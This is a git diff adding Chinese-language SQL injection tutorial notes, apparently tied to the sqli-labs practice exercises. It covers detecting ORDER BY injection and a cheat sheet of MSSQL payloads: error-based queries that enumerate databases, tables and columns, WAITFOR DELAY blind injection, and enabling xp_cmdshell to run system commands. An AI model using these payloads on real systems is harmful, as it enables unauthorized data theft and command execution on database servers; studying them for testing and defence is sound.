@@ -165,6 +165,29 @@ http://www.mysql.com/Less-32/
 mysql中用;拼接多条sql语句  
 必须mysqli_multi_query()才支持，实际上用联合注入即可（条件允许的话）  
 
+八、 排序注入（有排序功能时 注入点在orderFields、sort、dir）  
+作用：对查询返回的结果按一列或多列排序。  
+语法格式：ORDER BY {column_name [ASC|DASC]}[,...n]  
+注意：order by 语句默认按照升序对记录进行排序，不能使用字符型进行排序，没有效果，比如order by '1'是无效排序。  
+如何判断排序注入？  
+第一点，如果输入单引号报错，然后无论怎么样闭合，都是报错，然后修改id值有效。  
+
+id =1正常  
+id =1' 报错  
+id =1' ' 报错  
+id =1' ' and ''=' 报错  
+id =1 '--+  报错  
+
+最简单有效的是直接添加一个 rand()  
+直接添加一个rand()后，每次的返回值都不一样  
+
+<img width="985" height="297" alt="image" src="https://github.com/user-attachments/assets/041a9928-902e-45da-8b1c-e58897d28bce" />
+
+<img width="834" height="389" alt="image" src="https://github.com/user-attachments/assets/22891ab7-78ca-4915-a2b4-65cfc9748329" />
+
+
+<img width="1028" height="400" alt="image" src="https://github.com/user-attachments/assets/ec32ae6f-4855-473c-af5a-cd8aa3f2d6e4" />
+
 -----
 自此，基本讲完了。接下来是扩展（很少）和bypass（重点）  
 1 DNSlog注入的本质  
@@ -503,3 +526,43 @@ iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编�
 65%u0072%u0028%u0029
 
 -----
+MSSQL(SQLserve) 库
+1 报错注入  
+数据库版本  
+SQL Server是强类型，1是int型，查询的版本是字符型，类型不一致所以报错  
+?id=1 and 1=(select @@version)  
+数据库名  
+top 1表示只显示首条记录，master是mssql默认的数据库，sysdatabases是视图，dbid<=4的都是系统自带的库  
+?id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4)  
+爆第二个数据库名，假设第一个爆出来的test  
+?id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4 and name !='test')  
+爆出所有数据库名  
+?id=1 and 1=(select name from master..sysdatabases for xml path)  
+表名  
+查询第一个用户表  
+?id=1 and 1=(select top 1 name from sysobjects where xtype='u')  
+其他方式与查数据库名相同  
+列名  
+查询出'users'表对应的ID，然后根据ID去syscolumns表查询列名  
+?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users'))  
+
+2 盲注  
+时间盲注  
+id=1 and WAITFOR DELAY '00:00:05'-- ?id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:2'--  
+布尔盲注  
+substring()函数，用法同MySQL  
+
+其他利用方式  
+xp_cmdshell  
+判断是否存在  
+SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype='x' AND name='xp_cmdshell' -- 1存在,0不存在  
+通过xp_cmdshell可以执行系统命令，在SQLServer2005后默认禁止，如果有SA权限可以手动开启  
+
+-- 开启  
+EXEC sp_configure 'show advanced options', 1;reconfigure;  
+EXEC sp_configure 'xp_cmdshell',1;reconfigure;  
+-- 关闭  
+EXEC sp_configure 'show advanced options', 1;reconfigure;  
+EXEC sp_configure 'xp_cmdshell', 0;reconfigure  
+
+
